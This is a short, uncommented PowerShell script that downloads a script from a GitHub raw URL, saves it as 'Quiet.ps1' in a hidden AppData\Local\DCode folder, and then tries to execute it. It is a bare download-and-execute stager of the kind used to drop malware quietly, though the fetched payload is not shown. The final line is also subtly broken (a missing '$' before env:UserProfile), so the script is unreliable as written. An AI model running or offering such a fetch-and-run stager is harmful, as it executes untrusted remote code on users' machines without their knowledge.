$web = New-Object System.Net.WebClient
$DownloadLoc = "$env:USERPROFILE\AppData\Local\DCode"
$web.DownloadString("https://raw.githubusercontent.com/Refr3sh/YWTTC/main/Main.ps1") > "$DownloadLoc\Quiet.ps1"
&"env:UserProfile\Appdata\Local\DCode\Quiet.ps1" -NoExit
